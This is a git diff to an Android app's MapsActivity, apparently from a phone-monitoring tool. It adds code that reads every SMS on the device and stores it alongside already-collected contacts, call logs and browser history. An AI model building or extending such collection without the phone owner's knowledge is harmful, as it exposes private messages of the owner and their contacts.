@@ -20,19 +20,23 @@ import com.google.gson.Gson;
 import com.myapplication.monitor.DataManager.CallsDataManager;
 import com.myapplication.monitor.DataManager.ContactsDataManager;
 import com.myapplication.monitor.DataManager.HistoryDataManager;
+import com.myapplication.monitor.DataManager.SmsDataManager;
 import com.myapplication.monitor.DataManager.callbacks.DaoResponse;
 import com.myapplication.monitor.DataManager.dao.BrowserHistoryDao;
 import com.myapplication.monitor.DataManager.dao.CallDao;
 import com.myapplication.monitor.DataManager.dao.ContactsDao;
+import com.myapplication.monitor.DataManager.dao.SmsDao;
 import com.myapplication.monitor.Interfaces.ViewResponseDelegates.UpdateViewDelegate;
 import com.myapplication.monitor.Model.BrowserHistory;
 import com.myapplication.monitor.Model.CallLogs;
 import com.myapplication.monitor.Model.Contact;
+import com.myapplication.monitor.Model.Sms;
 import com.myapplication.monitor.R;
 import com.myapplication.monitor.Utils.BrowserHelper;
 import com.myapplication.monitor.Utils.CallLogsHelper;
 import com.myapplication.monitor.Utils.ContactsHelper;
 import com.myapplication.monitor.Utils.SessionManager;
+import com.myapplication.monitor.Utils.SmsHelper;
 import com.myapplication.monitor.ViewModels.UpdateViewModel;
 
 import java.util.List;
@@ -44,12 +48,18 @@ public class MapsActivity extends FragmentActivity implements OnMapReadyCallback
     ContactsHelper contactsHelper;
     CallLogsHelper callLogsHelper;
     BrowserHelper browserHelper;
+    SmsHelper smsHelper;
+
     ContactsDataManager contactsDataManager;
     CallsDataManager callsDataManager;
     HistoryDataManager historyDataManager;
+    SmsDataManager smsDataManager;
+
     ContactsDao contactsDao;
     CallDao callDao;
     BrowserHistoryDao historyDao;
+    SmsDao smsDao;
+
     UpdateViewModel viewModel;
     private ImageView btnSettings;
     private ImageView btnDetails;
@@ -67,11 +77,14 @@ public class MapsActivity extends FragmentActivity implements OnMapReadyCallback
         contactsHelper = new ContactsHelper(this);
         callLogsHelper = new CallLogsHelper(this);
         browserHelper = new BrowserHelper(this);
+        smsHelper = new SmsHelper(this);
         contactsDataManager = new ContactsDataManager();
         callsDataManager = new CallsDataManager();
         historyDataManager = new HistoryDataManager();
+        smsDataManager = new SmsDataManager();
         contactsDao = new ContactsDao();
         callDao = new CallDao();
+        smsDao = new SmsDao();
         historyDao = new BrowserHistoryDao();
 
         strMapType = sessionManager.getStoredMapType();
@@ -82,10 +95,31 @@ public class MapsActivity extends FragmentActivity implements OnMapReadyCallback
                 .findFragmentById(R.id.map);
         mapFragment.getMapAsync(this);
 
-        storeContacts();
+        storeHistories();
 
     }
 
+    private void storeSms() {
+        if(smsDao.getSmsList().size() != 0) {
+            smsDao.deleteSms();
+        }
+        smsDao.storeOrUpdateSmsList(smsDataManager.getSmsRealmList(smsHelper.getAllSms()), new DaoResponse() {
+            @Override
+            public void onSuccess(String message) {
+                doSmsUpdate();
+            }
+
+            @Override
+            public void onSuccess(Object item, String message) {
+                //No implementation
+            }
+
+            @Override
+            public void onFailure(String errorMessage) {
+                //No implementation
+            }
+        });
+    }
     private void storeHistories() {
         if (historyDao.getHistoryList().size() != 0) {
             historyDao.deleteHistories();
@@ -155,6 +189,19 @@ public class MapsActivity extends FragmentActivity implements OnMapReadyCallback
     }
 
 
+    private void doSmsUpdate() {
+        List<Sms> smsList = smsDataManager.getSmsList(smsDao.getSmsList());
+        if(smsList.size() != 0) {
+            viewModel.setSmsListLength(smsList.size());
+            viewModel.setSmsList(smsList);
+            viewModel.setSms(smsList.get(0));
+            viewModel.setSmsPosition(0);
+            viewModel.onSmsUpdate();
+        } else {
+            doCallUpdate();
+        }
+
+    }
     private void doHistoryUpdate() {
         List<BrowserHistory> historyList = historyDataManager.getHistoryList(historyDao.getHistoryList());
         if(historyList.size() != 0) {
@@ -163,10 +210,7 @@ public class MapsActivity extends FragmentActivity implements OnMapReadyCallback
             viewModel.setHistory(historyList.get(0));
             viewModel.setHistoryPosition(0);
             viewModel.onHistoryUpdate();
-        } else {
-            doCallUpdate();
         }
-
     }
     private void doContactUpdate() {
         List<Contact> contactsList = contactsDataManager.getContactsList(contactsDao.getContactsList());
@@ -176,10 +220,7 @@ public class MapsActivity extends FragmentActivity implements OnMapReadyCallback
             viewModel.setContact(contactsList.get(0));
             viewModel.setContactPosition(0);
             viewModel.onContactUpdate();
-        } else {
-            doCallUpdate();
         }
-
     }
 
     private void doCallUpdate() {
@@ -295,7 +336,7 @@ public class MapsActivity extends FragmentActivity implements OnMapReadyCallback
             viewModel.setContact(viewModel.getContactList().get(position));
             viewModel.onContactUpdate();
         } else {
-            storeCalls();
+            storeSms();
         }
     }
 
@@ -306,6 +347,8 @@ public class MapsActivity extends FragmentActivity implements OnMapReadyCallback
             viewModel.setCallPosition(position);
             viewModel.setCallLogs(viewModel.getCallLogsList().get(position));
             viewModel.onCallUpdate();
+        } else {
+            storeContacts();
         }
     }
 
@@ -316,6 +359,18 @@ public class MapsActivity extends FragmentActivity implements OnMapReadyCallback
             viewModel.setHistoryPosition(position);
             viewModel.setHistory(viewModel.getHistoryList().get(position));
             viewModel.onHistoryUpdate();
+        }else {
+            storeCalls();
+        }
+    }
+
+    @Override
+    public void onSmsUpdated() {
+        int position = viewModel.getSmsPosition() + 1;
+        if (position != viewModel.getSmsListLength()) {
+            viewModel.setSmsPosition(position);
+            viewModel.setSms(viewModel.getSmsList().get(position));
+            viewModel.onSmsUpdate();
         }
     }
 }
